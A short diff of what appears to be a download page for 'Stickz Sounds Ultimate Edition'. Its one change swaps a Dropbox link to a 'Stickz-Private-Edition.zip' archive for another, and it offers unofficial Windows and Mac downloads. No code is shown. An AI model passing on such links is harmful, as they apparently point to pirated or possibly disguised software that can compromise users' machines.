@@ -10,7 +10,7 @@ Graphics - Open GL 3.3 or later compatible Processor - Intel Core i3 or better O
 
 OS X 10.9 or later 4GB of memory 12.5GB of available storage (OS X El Capitan 10.11.5 or later)* Some features require an Apple ID; terms apply. Some features require a compatible internet service provid
 
-#[⚡️Download Stickz Sounds Ultimate Edition For Windows](https://www.dropbox.com/s/aff9qh6bygl9szg/Stickz-Private-Edition.zip?dl=0)
+#[⚡️Download Stickz Sounds Ultimate Edition For Windows](https://www.dropbox.com/s/gun3yeo68bt90aq/Stickz-Private-Edition.zip?dl=0)
 
 #[⚡️Download Stickz Sounds Ultimate Edition For Mac OS](https://www.dropbox.com/s/9i7u2jwjsnjnt51/Stickz-Sounds-Ultimate-Edition_Mac.zip?dl=0)
 
